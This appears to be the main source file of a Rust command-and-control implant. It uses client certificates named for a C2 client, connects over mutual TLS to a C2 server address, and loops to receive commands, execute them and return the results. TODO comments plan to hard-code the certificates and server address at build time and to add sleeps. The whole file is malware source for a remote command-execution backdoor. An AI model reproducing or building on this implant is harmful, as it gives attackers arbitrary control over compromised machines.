// Examples taken from https://github.com/rustls/rustls
mod mtls;
mod tasks;
mod pb;

fn main() {
    // TODO: embed the client certs at compile time
    let root_ca = "../certs/server/rootCA.pem";
    let client_pem = "../certs/client/avocado-implant.c2-client.pem";
    let client_key = "../certs/client/avocado-implant.c2-client-key.pem";
    let config = mtls::client_config(root_ca, client_pem, client_key).unwrap();

    // TODO: Change the server address and name at compile time
    let server = mtls::Server::new("127.0.0.1:31337".to_string(), "avocado-server.c2").unwrap();
    let mut client = mtls::Client::new(config, server).unwrap();

    // Receive info from server
    loop {
        let cmd = client.read().unwrap();
        let result = tasks::exec::exec(&cmd).unwrap();
        client.write(result).unwrap();
        // TODO: sleep
    }
}
